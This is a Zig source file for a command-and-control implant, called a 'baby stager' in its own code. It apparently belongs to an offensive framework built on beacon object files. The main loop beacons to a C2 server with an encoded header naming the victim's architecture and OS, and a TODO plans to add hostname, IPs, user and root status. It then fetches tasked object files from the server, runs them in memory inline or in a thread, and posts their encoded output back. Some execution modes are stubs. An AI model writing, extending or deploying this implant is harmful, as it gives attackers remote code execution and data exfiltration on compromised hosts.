const std = @import("std");
const assert = std.debug.assert;
const bof = @import("bofapi").bof;

const c2_host = "127.0.0.1:8000";
const c2_endpoint = "/endpoint";
const jitter = 3;

const stdout = std.io.getStdOut();

const UserContext = struct {
    id: i32,
    done_event: std.Thread.ResetEvent = .{},
};

fn completionCallback(
    bof_handle: bof.Handle,
    run_result: c_int,
    user_context: ?*anyopaque,
) callconv(.C) void {
    _ = bof_handle;
    _ = run_result;
    const context = @ptrCast(*UserContext, @alignCast(@alignOf(UserContext), user_context));
    context.done_event.set();
}

fn fetchBofContent(allocator: std.mem.Allocator, bof_uri: []const u8) ![]u8 {
    var h = std.http.Headers{ .allocator = allocator };

    var http_client: std.http.Client = .{ .allocator = allocator, .proxy = .{ .protocol = .plain, .host = "127.0.0.1", .port = 8080 } };
    defer http_client.deinit();

    defer h.deinit();
    var buf: [256]u8 = undefined;
    const uri = try std.fmt.bufPrint(&buf, "http://{s}{s}", .{ c2_host, bof_uri });
    const bof_url = try std.Uri.parse(uri);
    var bof_req = try http_client.request(.GET, bof_url, h, .{});
    defer bof_req.deinit();

    try bof_req.start();
    try bof_req.wait();

    if (bof_req.response.status != .ok) {
        stdout.writer().print("Expected response status '200 OK' got '{} {s}'", .{
            @enumToInt(bof_req.response.status),
            bof_req.response.status.phrase() orelse "",
        }) catch unreachable;
        return error.sdfsdfs;
    }

    const bof_content_type = bof_req.response.headers.getFirstValue("Content-Type") orelse {
        stdout.writer().print("Missing 'Content-Type' header", .{}) catch unreachable;
        return error.sdfsdfs;
    };

    if (!std.ascii.eqlIgnoreCase(bof_content_type, "application/octet-stream")) {
        stdout.writer().print("Expected 'Content-Type: application/octet-stream' got '{s}'", .{bof_content_type}) catch unreachable;
        return error.sdfsdfs;
    }

    const bof_content = try allocator.alloc(u8, bof_req.response.content_length.?);
    errdefer allocator.free(bof_content);

    _ = try bof_req.readAll(bof_content);

    return bof_content;
}

pub fn main() !u8 {

    // TODO get it from victim machine
    const arch = "x86_64";
    const os = "linux";
    const authz = arch ++ ":" ++ os;

    stdout.writer().print("Hello! baby stager here!\n", .{}) catch unreachable;

    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();

    var http_client: std.http.Client = .{ .allocator = allocator, .proxy = .{ .protocol = .plain, .host = "127.0.0.1", .port = 8080 } };
    defer http_client.deinit();

    var heartbeat_header = std.http.Headers{ .allocator = allocator };
    defer heartbeat_header.deinit();

    // TODO: Authorization: base64(ipid=arch:OS:hostname:internalIP:externalIP:currentUser:isRoot)
    const base64_encoder = std.base64.Base64Encoder.init(std.base64.standard_alphabet_chars, '=');
    var authz_b64 = try allocator.alloc(u8, base64_encoder.calcSize(authz.len));
    defer allocator.free(authz_b64);
    _ = std.base64.Base64Encoder.encode(&base64_encoder, authz_b64, authz);
    try heartbeat_header.append("Authorization", authz_b64);

    const heartbeat_uri = try std.Uri.parse("http://" ++ c2_host ++ c2_endpoint);

    while (true) {
        // send heartbeat to C2 and check if any tasks are pending
        var req = try http_client.request(.GET, heartbeat_uri, heartbeat_header, .{});
        defer req.deinit();

        try req.start();
        try req.wait();

        if (req.response.status != .ok) {
            stdout.writer().print("Expected response status '200 OK' got '{} {s}'", .{
                @enumToInt(req.response.status),
                req.response.status.phrase() orelse "",
            }) catch unreachable;
            return 0;
        }

        const content_type = req.response.headers.getFirstValue("Content-Type") orelse {
            stdout.writer().print("Missing 'Content-Type' header", .{}) catch unreachable;
            return 0;
        };

        // task received from C2?
        if (std.ascii.eqlIgnoreCase(content_type, "application/json")) {
            const resp_content = try allocator.alloc(u8, req.response.content_length.?);
            defer allocator.free(resp_content);
            _ = try req.readAll(resp_content);

            var parsed = try std.json.parseFromSlice(std.json.Value, allocator, resp_content, .{});
            defer parsed.deinit();

            // check type of task to execute:
            // bof - execute bof
            // cmd - execute builtin command (like: sleep 10)
            var root = parsed.value;
            var task = root.object.get("name").?.string;

            var request_id = root.object.get("id").?.string;

            var iter_task = std.mem.tokenize(u8, task, ":");
            const cmd_prefix = iter_task.next() orelse return error.BadData;
            const cmd_name = iter_task.next() orelse return error.BadData;

            // tasked to execute bof?
            if (std.mem.eql(u8, cmd_prefix, "bof")) {
                stdout.writer().print("Executing bof: {s}\n", .{cmd_name}) catch unreachable;

                const bof_args_b64 = root.object.get("args").?.string;
                const base64_decoder = std.base64.Base64Decoder.init(std.base64.standard_alphabet_chars, '=');
                const len = try std.base64.Base64Decoder.calcSizeForSlice(&base64_decoder, bof_args_b64);
                var bof_args = try allocator.alloc(u8, len);
                defer allocator.free(bof_args);
                _ = try std.base64.Base64Decoder.decode(&base64_decoder, bof_args, bof_args_b64);

                const bof_path = root.object.get("path").?.string;

                // fetch bof content
                const bof_content = try fetchBofContent(allocator, bof_path);
                defer allocator.free(bof_content);

                // process header
                const bof_header = root.object.get("header").?.string;
                var iter_hdr = std.mem.tokenize(u8, bof_header, ":");
                const exec_mode = iter_hdr.next() orelse return error.BadData;
                //TODO: handle 'buffers'
                //const args_spec = iter_hdr.next() orelse return error.BadData;

                var bof_handle: bof.Handle = undefined;
                var context = UserContext{ .id = 2 };

                if (std.mem.eql(u8, exec_mode, "inline")) {
                    stdout.writer().print("Execution mode: {s}-based\n", .{exec_mode}) catch unreachable;
                    _ = bof.loadAndRun(
                        "dsfsdf",
                        bof_content.ptr,
                        @intCast(i32, bof_content.len),
                        @constCast(bof_args.ptr),
                        @intCast(i32, bof_args.len),
                        &bof_handle,
                    );
                    //defer bof.unload(bof_handle);

                    //stdout.writer().print("Bof output:\n{s}", .{bof.getOutput(bof_handle).?}) catch unreachable;
                } else if (std.mem.eql(u8, exec_mode, "thread")) {
                    stdout.writer().print("Execution mode: {s}-based\n", .{exec_mode}) catch unreachable;

                    _ = bof.initLauncher();
                    defer bof.deinitLauncher();

                    context = UserContext{ .id = 1 };

                    _ = bof.load("sgsfgr", bof_content.ptr, @intCast(c_int, bof_content.len), &bof_handle);
                    //defer bof.unload(bof_handle);

                    _ = bof.runAsync(
                        bof_handle,
                        @constCast(bof_args.ptr),
                        @intCast(i32, bof_args.len),
                        completionCallback,
                        @ptrCast(*UserContext, &context),
                    );
                    context.done_event.wait();
                } else if (std.mem.eql(u8, exec_mode, "process")) {
                    stdout.writer().print("Execution mode: {s}-based\n", .{exec_mode}) catch unreachable;
                }

                if (bof.getOutput(bof_handle)) |bofOutput| {
                    stdout.writer().print("Bof output:\n{s}", .{bofOutput}) catch unreachable;
                    var out_b64 = try allocator.alloc(u8, base64_encoder.calcSize(bofOutput.len));
                    defer allocator.free(out_b64);
                    _ = std.base64.Base64Encoder.encode(&base64_encoder, out_b64, bofOutput);

                    var h = std.http.Headers{ .allocator = allocator };
                    defer h.deinit();
                    try h.append("content-type", "text/plain");
                    try h.append("Authorization", request_id);

                    var reqRes = try http_client.request(.POST, heartbeat_uri, h, .{});
                    defer reqRes.deinit();

                    reqRes.transfer_encoding = .{ .content_length = out_b64.len };

                    try reqRes.start();
                    try reqRes.writeAll(out_b64);
                    try reqRes.finish();

                    bof.unload(bof_handle);
                }

                // tasked to execute builtin command?
            } else if (std.mem.eql(u8, cmd_prefix, "cmd")) {
                stdout.writer().print("Executing builtin command: {s}\n", .{cmd_name}) catch unreachable;
            }
        }

        std.time.sleep(jitter * 1e9);
    }

    return 0;
}
